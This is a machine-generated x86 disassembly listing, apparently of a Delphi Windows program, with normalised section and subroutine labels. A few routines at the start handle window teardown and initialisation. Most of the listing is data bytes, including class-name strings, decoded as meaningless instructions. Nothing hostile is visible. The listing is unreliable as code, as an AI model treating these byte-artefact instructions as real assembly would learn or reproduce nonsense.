push esi
call GetWindowLongA
mov ebx eax
push esi
call DestroyWindow
cmp ebx DefWindowProcA
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_41a398
sub_41a498
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41a53c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a543
retn
mov eax [ rw-data ]
call sub_4130a8
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
call sub_41a264
xor edx edx
xor eax eax
call sub_416494
mov eax rw-data
call sub_40cc70
call sub_405be4
lea eax [ eax + 0xc ]
call sub_40cc70
mov eax rw-data
call sub_40cc70
mov eax rw-data
call sub_4054b4
mov eax sub_41a2d0
call sub_405350
mov eax rw-data
call sub_40cc70
call sub_419090
mov eax rw-data
call sub_40cc70
mov eax rw-data
call sub_4054b4
sub_41a548
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41a5d1
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a5d8
retn
call sub_41905c
mov eax sub_41a2d0
call sub_405348
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c9b0
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
call sub_4054cc
mov dl 0x1
mov eax [ r-xdata ]
call sub_4129a4
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_413acc
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_413acc
mov [ rw-data ] eax
sub edx 0xffffffd4
sub_41a5dc
mov [ fs : esi ] 0x8d
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ esi + 0x640000ff ] cl
mov [ esi ] 0x8f
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ eax - 0x1 ] dh
add [ eax ] al
mov [ fs : esi ] 0x71
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ edx - 0x1 ] dh
add [ eax ] al
mov [ fs : esi ] 0x73
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ edi + edi * 8 ] dh
add [ esi + eax * 8 + 0x46 ] ah
add [ ebp - 0x1 ] dh
add [ eax ] al
mov [ fs : esi ] 0x76
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ edi - 0x1 ] dh
add [ eax ] al
mov [ fs : esi ] 0x78
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ecx - 0x1 ] bh
add [ eax ] al
mov [ fs : esi ] 0x7a
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ebx - 0x1 ] bh
add [ eax ] al
mov [ fs : esi ] 0x7c
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ebp - 0x1 ] bh
add [ eax ] al
mov [ fs : esi ] 0x7e
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ edi - 0x1 ] bh
add [ eax ] al
mov [ fs : esi ] 0x60
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ecx - 0x1 ] ah
add [ eax ] al
mov [ fs : esi ] 0x62
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ebx - 0x1 ] ah
add [ eax ] al
mov [ fs : esi ] 0x64
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ebp - 0x1 ] ah
add [ eax ] al
mov [ fs : esi ] 0x66
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ edi - 0x1 ] ah
add [ eax ] al
mov [ fs : esi ] 0x68
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ecx - 0x1 ] ch
add [ eax ] al
mov [ fs : esi ] 0x6a
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ebx - 0x1 ] ch
add [ eax ] al
mov [ fs : esi ] 0x6c
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ebp - 0x1 ] ch
add [ eax ] al
mov [ fs : esi ] 0x6e
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ edi - 0x1 ] ch
add [ eax ] al
mov [ fs : esi ] 0x50
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ecx - 0x1 ] dl
add [ eax ] al
mov [ fs : esi ] 0x52
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ebx - 0x1 ] dl
add [ eax ] al
mov [ fs : esi ] 0x54
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ebp - 0x1 ] dl
add [ eax ] al
mov [ fs : esi ] 0x56
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ edi - 0x1 ] dl
add [ eax ] al
mov [ fs : esi ] 0x58
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ecx - 0x1 ] bl
add [ eax ] al
mov [ fs : esi ] 0x5a
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ebx - 0x1 ] bl
add [ eax ] al
mov [ fs : esi ] 0x5c
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ebp - 0x1 ] bl
add [ eax ] al
mov [ fs : esi ] 0x5e
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ edi - 0x1 ] bl
add [ eax ] al
mov [ fs : esi ] 0x40
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ecx - 0x1 ] al
add [ eax ] al
mov [ fs : esi ] 0x42
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ebx - 0x1 ] al
add [ eax ] al
mov [ fs : esi ] 0x44
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ebp - 0x1 ] al
add [ eax ] al
mov [ fs : esi ] 0x46
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ edi - 0x1 ] al
add [ eax ] al
mov [ fs : esi ] 0x48
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ecx - 0x1 ] cl
add [ eax ] al
mov [ fs : esi ] 0x4a
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ebx - 0x1 ] cl
add [ eax ] al
mov [ fs : esi ] 0x4c
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ebp - 0x1 ] cl
add [ eax ] al
mov [ fs : esi ] 0x4e
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ edi - 0x1 ] cl
add [ eax ] al
mov [ fs : esi ] 0x30
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ecx ] dh
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ edx ] dh
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ebx ] dh
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ edi + edi * 8 ] dh
add [ eax ] al
mov [ fs : esi ] 0x35
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ esi ] dh
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ edi ] dh
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ eax ] bh
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ecx ] bh
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ edx ] bh
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ebx ] bh
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ edi + edi * 8 ] bh
add [ eax ] al
mov [ fs : esi ] 0x3d
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ esi ] bh
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ edi ] bh
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ eax ] ah
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ ecx ] ah
inc [ eax ]
add [ esi + eax * 8 + 0x46 ] ah
add [ edx ] ah
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_41a8b1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a8b8
retn
sub_41a8c4
enter 0x41a8 0x0
add [ esi ] eax
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
lea eax [ eax ]
sub [ ecx + 0x41 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ ecx + 0xc0041 ] ch
add [ eax ] al
fsubr [ ebp + 0x40 ]
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 4 + 0xc0041 ] al
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
cmovne ecx [ ecx + 0x6e ]
jbe r-xdata
outsb
je r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
sbb [ ebp + 0x49 ] al
outsb
jbe r-xdata
popad
jo r-xdata
add [ eax ] al
fsubr [ ebp + 0x40 ]
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ ecx + ebp * 4 + 0x41 ] ax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ ecx + 0xc0041 ] ch
outsd
outsb
je r-xdata
imul esi [ ebx + 0x68 ] 0x1
add [ edx ] al
add [ eax ] al
add [ eax + 0x90041a9 ] ah
jo r-xdata
inc esi
outsd
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ edi + 0x70 ] cx
jb r-xdata
push esp
inc esi
imul esp [ ebx + 0x4f ] 0x61726570
jb r-xdata
push 0x65737261
je r-xdata
popa
jne r-xdata
jae r-xdata
popad
insd
nop
clc
test eax 0xc010041
je r-xdata
je r-xdata
outsd
outsb
lea eax [ eax ]
movsb [ edi ] [ esi ]
test eax 0xa030041
push esp
inc esi
outsd
je r-xdata
imul ebp [ esi + 0x65 ] 0x5373660b
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
inc [ eax ]
add [ eax ] al
nop
adc al 0xaa
inc ecx
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
insb
or [ fs : esi + 0x73 ] ah
je r-xdata
jae r-xdata
outsb
pop es
jo r-xdata
jo r-xdata
imul ebp [ ebx + 0x65 ] 0x874754f
inc edi
jb r-xdata
jae r-xdata
je r-xdata
push es
jo r-xdata
jb r-xdata
insb
imul esp [ ebx + 0xb ] 0x6e557366
pop es
jo r-xdata
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edi ] cl
add [ eax ] al
add al ah
stosb [ edi ]
inc ecx
add [ edi ] al
outsd
insb
imul esp [ esi + eax + 0x70 ] 0x73614473
push 0x44737005
outsd
or al 0x70
inc ebx
insb
popad
jb r-xdata
jo r-xdata
inc esp
inc esp
outsd
je r-xdata
jo r-xdata
stosb [ edi ]
inc ecx
add [ ebx + 0x41aa7cc0 ] cl
adc [ edx - 0x3f74ffbf ] ch
jl r-xdata
push ebx
insb
add [ gs : eax ] eax
add [ eax ] al
jo r-xdata
inc esp
popad
jae r-xdata
imul edi [ eax + 0x65 ] 0x72470864
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
adc [ edx + 0x66060041 ] ch
jae r-xdata
popad
jb r-xdata
je r-xdata
inc edx
insb
popad
arpl [ ebx + 0x7 ] bp
jo r-xdata
or al 0x70
jae r-xdata
jo r-xdata
push ebx
je r-xdata
push eax
or [ edi + 0x72 ] al
jo r-xdata
arpl [ ebx - 0x75 ] si
dec ebp
jb r-xdata
outsd
je r-xdata
imul eax [ edi ] 0x70
insd
outsd
imul esp [ ebx + 0x73 ] 0xaa64c08b
inc ecx
add [ esi ] al
or edx [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ eax - 0x56 ] bh
inc ecx
add [ edi ] al
jo r-xdata
add [ ebx ] al
add [ eax ] al
add [ eax ] dl
stosb [ edi ]
inc ecx
add [ esi ] al
jae r-xdata
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] edx
outsb
push ebx
je r-xdata
inc ecx
outsd
imul eax [ 0x6f586d70 ] 0x72
or [ eax + 0x6d ] dh
dec esi
outsd
je r-xdata
add eax 0x6f4e6d70
je r-xdata
add eax 0x6f447370
je r-xdata
or esp [ gs : esi + 0x73 ]
push ebx
outsb
je r-xdata
imul esp [ ebx + 0x73 ] 0x41a9e890
add [ edx ] cl
or [ esi + eax * 2 + 0x6f ] edx
dec ecx
je r-xdata
jo r-xdata
popad
bound ebp [ ebp + 0x7 ]
pop es
bound esi [ ebx + 0x53 ]
jb r-xdata
insd
push edi
push 0x5657469
jo r-xdata
jo r-xdata
pop es
popad
jae r-xdata
jo r-xdata
inc esp
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
mov [ ecx + eax * 2 ] gs
add [ eax ] al
add [ eax ] al
add [ eax - 0x54 ] dh
insb
or al 0x70
insd
dec ebp
popad
jae r-xdata
jo r-xdata
imul esp [ ebx + 0x73 ] 0x41aae490
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] dl
outsb
outsb
dec esi
outsd
je r-xdata
dec ecx
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 4 + 0x41 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
jae r-xdata
shl [ eax + 0x30041ab ] 0xb
push esp
inc edx
jb r-xdata
push 0x8b736369
push eax
outsb
dec esi
outsd
insd
outsd
jo r-xdata
dec esi
outsd
je r-xdata
jo r-xdata
dec esi
outsd
jae r-xdata
or eax 0x6e497370
je r-xdata
je r-xdata
add eax 0x6f4e6d70
imul esp [ ecx + 0x67 ] 0x6c616e6f
outsd
jb r-xdata
or [ eax + 0x6d ] esi
jo r-xdata
push es
or ah [ edx + 0x73 ]
push esi
jb r-xdata
bound esi [ ebx + 0x48 ]
push es
jo r-xdata
bound esi [ ebx + 0x46 ]
or [ eax + 0x6d ] esi
pop eax
dec esi
inc esp
outsd
lodsb [ esi ]
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax + 0x3e ] cl
inc ecx
add [ eax + 0x3f ] bl
inc ecx
add [ eax + 0x3f ] ah
inc ecx
add [ esi + edi + 0x41 ] dh
popad
outsd
insb
imul esp [ edi + eax + 0x62 ] 0x656c4373
popad
jb r-xdata
bound esi [ ebx + 0x43 ]
insb
popad
dec esi
outsd
je r-xdata
add [ eax ] al
add [ ebx + ebp * 4 + 0x62070041 ] bl
jae r-xdata
dec ebp
jb r-xdata
insd
inc esi
jb r-xdata
inc esp
or esp [ edx + 0x73 ]
inc ecx
jb r-xdata
or eax 0x654d6d70
jb r-xdata
jo r-xdata
or edx [ edx + eax * 2 + 0x72 ]
jne r-xdata
or eax 0x654d6d70
jb r-xdata
jae r-xdata
popad
jae r-xdata
dec ebp
push eax
outsb
insb
add [ ecx ] al
add ch bh
jae r-xdata
mov eax eax
mov al [ 0x30041ab ]
inc edi
jb r-xdata
jb r-xdata
inc ebx
outsd
jo r-xdata
inc eax
add [ eax + 0x33 ] bh
inc esi
imul esp [ ebx + 0x61 ] 0x73620b6c
inc ecx
add [ eax ] bl
add [ eax ] al
add [ eax + 0x16 ] ah
jpe r-xdata
insb
dec ebp
popad
jae r-xdata
push 0x41ad
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ esp - 0x54 ] si
inc ecx
add ah dl
push ss
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
popad
imul esp [ ebx + 0x73 ] 0x41ac6490
add [ gs : eax ] eax
add [ eax ] al
outsb
pop es
jo r-xdata
add [ edi ] al
dec esi
outsd
je r-xdata
je r-xdata
popad
jo r-xdata
insd
or [ gs : edi + 0x72 ] al
dec esp
jo r-xdata
dec ebp
popad
jae r-xdata
inc ecx
push 0x6c797453
jae r-xdata
outsd
jb r-xdata
or esp [ edx + 0x73 ]
inc edx
inc esp
imul esp [ ecx + 0x67 ] 0x6c616e6f
insb
add eax 0x6f586d70
rol [ ecx ] 0xf
push esp
inc edi
jb r-xdata
or esp [ edx + 0x73 ]
inc esp
imul esp [ ecx + 0x67 ] 0x736f7243
jae r-xdata
pop es
bound esi [ ebx + 0x43 ]
jb r-xdata
outsd
outsb
jo r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
imul esp [ ebx + 0x73 ] 0xaba0c08b
inc ecx
inc ecx
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
outsb
je r-xdata
add [ 0x6e6f4654 ] al
je r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add ah bl
retn
inc ecx
add [ eax + eax ] ah
add [ eax ] al
sbb [ ecx + eax * 2 + 0x40337000 ] ch
pop esi
lodsd [ esi ]
jo r-xdata
add [ eax ] al
mov ah 0xac
inc ecx
add [ eax ] ah
add [ eax ] al
add [ ecx ] al
add ch bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x53 ] dl
inc ecx
add [ esi - 0x53 ] bl
imul esp [ ebx + 0x73 ] 0xffff0001
nop
cmp [ ebp + 0x41 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
lodsd [ esi ]
inc ecx
add [ eax - 0x53 ] ch
inc ecx
add [ eax ] al
add [ eax ] eax
inc ecx
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ esp + ecx * 4 - 0x54 ] si
dec ebp
jb r-xdata
add [ ebx ] al
outsb
lodsb [ fs : esi ]
nop
inc edi
outsd
popad
insb
dec esi
outsd
je r-xdata
add [ eax - 0x54 ] bh
insb
add [ edi + eax * 8 + 0x41 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48060002 ] al
lodsd [ esi ]
inc ecx
add [ edi ] al
add eax 0x6e6f4654
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
lodsb [ esi ]
inc ecx
add [ eax + 0x33 ] dh
inc eax
imul esp [ ebx + 0x73 ] 0xc08b0000
mov eax 0xf0041ac
cmovns eax [ ebx + 0x68 ]
popad
outsb
dec esi
outsd
je r-xdata
dec esi
outsd
or dh [ gs : eax + 0x6d ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add al 0x4e
add [ eax ] eax
inc ecx
add ah bh
mov [ ecx ] 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x69530400
jpe r-xdata
inc ecx
lodsd [ esi ]
inc ecx
add [ eax + 0x70041ac ] cl
add [ eax ] cl
inc edi
jb r-xdata
inc [ esp + eax * 8 ]
inc ecx
inc eax
add ah bl
xor [ eax ] al
fadd st3
inc ecx
add [ eax + 0x3f ] bl
inc ecx
add [ eax + 0x3f ] ah
inc ecx
add [ eax ] ah
les eax [ ecx ]
push cs
imul sp [ ebp + 0x72 ] 0x1114
inc eax
add [ ecx ] al
and [ ebx ] esp
mov dh 0x1f
cmpsd [ esi ] [ edi ]
inc esp
rcl [ ecx ] 0x1
sahf
xchg ebx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4708da82
jb r-xdata
inc eax
add ah bl
xor [ eax ] al
clc
pushad
stosb [ edi ]
inc ecx
add [ eax + ecx * 8 ] bl
inc ecx
add [ eax ] ch
enter 0x41 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53050006 ] al
je r-xdata
popad
insd
mov al [ gs : 0x540041a9 ]
enter 0x41 0x5c
enter 0x41 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
add eax 0x63746950
push r-xdata
loopne r-xdata
adc [ eax ] al
cmp al 0xc7
inc ecx
imul esp [ gs : edi + 0x68 ] 0x41a9e474
add al [ eax ]
push es
dec eax
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ esp + ebp * 4 + 0x200041 ] dh
add [ eax ] al
add [ eax ] eax
std
add [ esi ] cl
jo r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
insb
lea eax [ eax ]
mov ah 0xae
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
scasb [ edi ]
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
scasb [ edi ]
inc ecx
add [ eax + eax ] bl
add [ eax ] al
sbb [ ecx + eax * 2 + 0x40337000 ] ch
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ edi + eax * 8 + 0x41 ] ch
add [ edi + eax * 8 + 0x10041 ] al
in al 0xa9
inc ecx
imul esp [ ebx + 0x73 ] 0xa9f40007
inc ecx
add [ eax + ecx * 8 - 0x3773ffbf ] al
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070000 ] al
push 0x65737261
je r-xdata
insb

imul esp [ ebx + 0x73 ] 0xa8c40004
inc ecx
add [ eax + eax ] al
enter 0x41 0x58
aas
inc ecx
add [ eax + 0x3f ] ah
inc ecx
add [ eax ] ah
leave
inc ecx
add [ esp + edx * 2 ] al
push eax
outsb
lea eax [ eax ]
int3
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add al bh
je r-xdata
inc esi
outsd
outsb
add [ eax ] bl
add [ eax ] al
[ ebp + eax * 8 + 0x41 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050001 ] al
outsd
insb
outsd
jb r-xdata
test al 0x41
add [ eax - 0x36 ] al
inc ecx
add [ eax - 0x36 ] cl
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
test al 0x41
stosb [ edi ]
inc ecx
add [ eax ] bl
add [ eax ] al
[ eax ]
sub_41b208
test al 0x40
inc ecx
add [ eax - 0x16 ] dl
inc ecx
add [ eax ] ch
sub [ eax ] eax
or al 0xeb
inc ecx
add [ eax ] ch
sub [ eax ] eax
sub [ ecx ] ch
inc eax
add [ esp + ebp * 8 + 0x41 ] dl
add [ eax - 0x14 ] bl
inc ecx
add [ eax ] ch
sub [ eax ] eax
fsubr st4
inc ecx
add [ eax ] ch
sub [ eax ] eax
cmp al 0xed
inc ecx
add [ eax - 0x13 ] al
inc ecx
add [ eax ] ch
sub [ eax ] eax
push eax
in eax dx
inc ecx
add [ eax ] bl
0xec5c0041 0x41
sub_41b24c
in al 0xec
inc ecx
add [ eax ] ch
sub [ eax ] eax
sub [ ecx ] ch
inc eax
add [ eax ] ch
sub [ eax ] eax
sub [ ecx ] ch
inc eax
add [ ecx ] al
add ch bh
push [ eax + 0x80041ec ]
push esp
inc edi
jb r-xdata
test eax 0xb70041b2
mov dl 0x41
add cl al
jo r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ edi + ebp * 8 - 0x1013ffbf ] bh
inc ecx
add [ esi * 8 - 0xd7bffbf ] bl
inc ecx
add [ eax + 0xe004140 ] ch
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ esp + ebp * 4 + 0x180041 ] dh
add [ eax ] al
add al [ eax ]
std
mov dl 0x41
add [ ecx - 0x5effbe4e ] bl
mov dl 0x41
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x7ab8cd12 ] ah
aam 0x11
imul esp [ ebx - 0x73 ] 0xb2780040
inc ecx
add [ edi ] al
or [ edi + eax * 2 + 0x72 ] dl
popad
jo r-xdata
int 0xb8
jpe r-xdata
imul esp [ ebx - 0x4 ] 0xd40041b1
pop ss
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
inc ecx
add [ eax + 0x41b3 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x4d ] dh
inc ecx
add [ eax + 0x2c0041b3 ] al
add [ eax ] al
add [ eax + 0x17 ] dl
inc ecx
add [ eax + 0x33 ] dh
inc eax
add [ eax ] bl
inc eax
inc ecx
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
sbb edx 0x0
aam 0x11
ror [ edi + 0x60 ] 0xb2
fxch st6
mov dl 0x41
add [ eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x41b350c0 ] cl
jo r-xdata
add dl ah
mov dl 0x41
add [ eax ] al
add [ eax ] al
add [ eax - 0x4d ] ah
sub [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
push eax
mov bl 0x41
imul esp [ ebx + 0x73 ] 0xcc900000
add eax 0xffffffd8
jmp sub_41f254
sub_41b414
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
mov ah 0x41
add [ eax + eax ] ah
add [ eax ] al
mov al 0xb3
inc ecx
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
mov ch 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
mov ch 0x41
add [ eax ] dh
add [ eax ] al
add [ eax + 0x700041b1 ] dh
xor eax [ eax ]
sbb [ eax + 0x41 ] al
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax - 0xb ] ch
inc ecx
add [ ebp + esi * 8 + 0x540e0041 ] ah
dec ebp
je r-xdata
test [ ecx ] sub_41ec58
cmp al 0xf8
inc ecx
add [ ecx + edi * 8 ] bl
inc ecx
add [ eax + 0x3c0041fc ] bh
in eax dx
inc ecx
add [ ebp + edi * 8 - 0x257ffbf ] ah
inc ecx
add [ eax ] al
inc [ ecx ]
test al 0xf5
inc ecx
add [ esp + ebp * 8 + 0x41 ] bl
add al bl
sti
inc ecx
add [ eax - 0x63ffbe08 ] ah
cld
inc ecx
add [ ecx + eax + 0x42 ] dl
add al bl
add [ edx ] eax
or [ ebp + ecx * 2 + 0x65 ] edx
je r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add al dh
cmc
inc ecx
add [ eax + 0x3f ] bl
inc ecx
add al al
0xf6200041 0x41
add [ eax + 0x50004140 ] ch
0xf6b40041 0x41
imul bp [ ebp + 0x49 ] 0x616d
nop
mov esp 0x41b4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
add [ ebx + esi + 0x33780040 ] al
imul bp [ ebp - 0x75 ] 0x30c0
mov ch 0x41
add [ edi ] al
or [ ebp + ecx * 2 + 0x65 ] edx
je r-xdata
pop ss
inc edx
add [ eax - 0x14 ] bl
inc ecx
add [ eax + 0x17 ] ch
inc edx
add [ ebx + ebx + 0x42 ] dl
add [ eax + 0x23 ] dl
inc edx
add [ esp ] ah
inc edx
add [ eax - 0x13 ] al
inc ecx
add [ eax + 0x25 ] cl
inc edx
add [ ebp + 0x106c0042 ] bl
inc edx
add [ esp + ebp * 8 + 0x41 ] bl
add ah ah
in al dx
inc ecx
add [ eax ] dh
sbb al [ edx ]
pop esp
sub [ edx ] al
lodsb [ esi ]
sbb [ edx ] eax
sub [ fs : edx ] al
jl r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add ah dl
adc [ edx ] al
pop eax
aas
inc ecx
add al al
0x11100041 0x42
inc edx
add [ esp + edx * 2 ] cl
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x616d4970
call 0x4441f7a2
push es
imul bp [ ebp - 0x44 ] 0x41b4
add [ edx + esi * 4 + 0x41 ] dh
add [ eax ] al
